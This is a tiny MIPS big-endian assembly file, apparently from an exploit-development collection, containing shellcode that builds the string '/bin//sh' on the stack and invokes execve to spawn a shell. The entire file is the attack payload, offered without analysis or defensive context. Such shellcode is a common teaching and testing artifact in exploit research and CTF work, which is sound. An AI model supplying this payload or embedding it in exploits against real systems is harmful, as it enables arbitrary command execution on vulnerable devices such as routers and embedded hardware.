;;;
;;; MIPS big endian sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
li $v0, "/bin"
sw $v0, 0($sp)
li $v0, "//sh"
sw $v0, 4($sp)
li $v0, __NR_SYS_execve
move $a0, $sp
addiu $a1, $zero, 0
addiu $a2, $zero, 0
syscall
